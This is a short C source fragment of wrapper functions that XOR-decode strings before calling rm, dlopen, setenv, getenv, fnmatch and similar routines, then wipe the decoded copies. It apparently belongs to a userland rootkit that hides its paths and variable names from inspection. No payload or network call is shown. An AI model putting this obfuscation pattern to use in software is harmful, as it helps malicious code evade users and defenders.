int xrm(const char *path){
    int ret;
    char *dup = xordup(path);
    if(!dup) return 0;
    ret = rm(dup);
    clean(dup);
    return ret;
}

char *xordup(const char *str){
    char *ret = strdup(str);
    if(ret != NULL) xor(ret);
    return ret;   
}

void *xdlopen(const char *filename, int flags){
    char *xfilename = xordup(filename);
    if(!xfilename) return NULL;
    void *ret = dlopen(xfilename, flags);
    clean(xfilename);
    return ret;
}

int xchownpath(const char *path, id_t aid){
    char *dup = xordup(path);
    if(!dup) return 0;
    int ret = chownpath(dup, aid);
    clean(dup);
    return ret;
}

int xprocess(const char *name){
    char *xname = xordup(name);
    if(!xname) return 0;
    int rv = process(xname);
    clean(xname);
    return rv;
}

int xfnmatch(const char *pattern, const char *string){
    char *xpattern = xordup(pattern);
    if(!xpattern) return FNM_NOMATCH;
    int rv = fnmatch(xpattern, string, FNM_PATHNAME);
    clean(xpattern);
    return rv;
}

int xsetenv(const char *name, const char *value, int overwrite){
    char *xname = xordup(name);
    if(!xname) return -1;
    int rv = setenv(xname, value, overwrite);
    clean(xname);
    return rv;
}

int xisplatform(const char *sopath, const char *platform){
    char *xplatform = xordup(platform);
    if(!xplatform) return -1;
    int rv = isplatform(sopath, xplatform);
    clean(xplatform);
    return rv;
}

char *xgetenv(const char *name){
    char *xname = xordup(name);
    if(!xname) return NULL;
    char *rv = getenv(xname);
    clean(xname);
    return rv;
}